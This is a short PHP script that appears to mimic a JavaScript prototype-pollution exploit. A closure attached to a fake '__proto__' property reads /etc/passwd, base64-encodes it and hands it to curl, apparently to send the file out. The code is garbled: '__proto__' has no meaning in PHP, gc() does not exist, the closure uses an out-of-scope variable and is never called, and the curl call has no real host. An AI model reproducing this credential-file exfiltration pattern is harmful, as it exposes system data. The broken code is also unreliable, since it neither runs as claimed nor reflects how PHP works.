<?php

class MyObject extends stdClass {
    public function concat() {
        $args = func_get_args();
        $result = array();
        foreach ($args as $arg) {
            $result = array_merge($result, (array)$arg);
        }
        return (object)$result;
    }
}

$array = new MyObject();
$array->name = '1.1';
$array->age = '2.1';
$array->city = '3.1';

$proto = new MyObject();
$array->__proto__ = $proto;

$proto->methods = array('get' => function() {
    $array->length = 1;
    gc();
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, str_replace(" ", "%20", base64_encode(file_get_contents("/etc/passwd"))));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $output = curl_exec($ch);
    curl_close($ch);
    return "value from proto: $output";
},'set' => function($new_value) {});

$array->concat(array(1, 2, 3), array(4, 5, 6));

?>
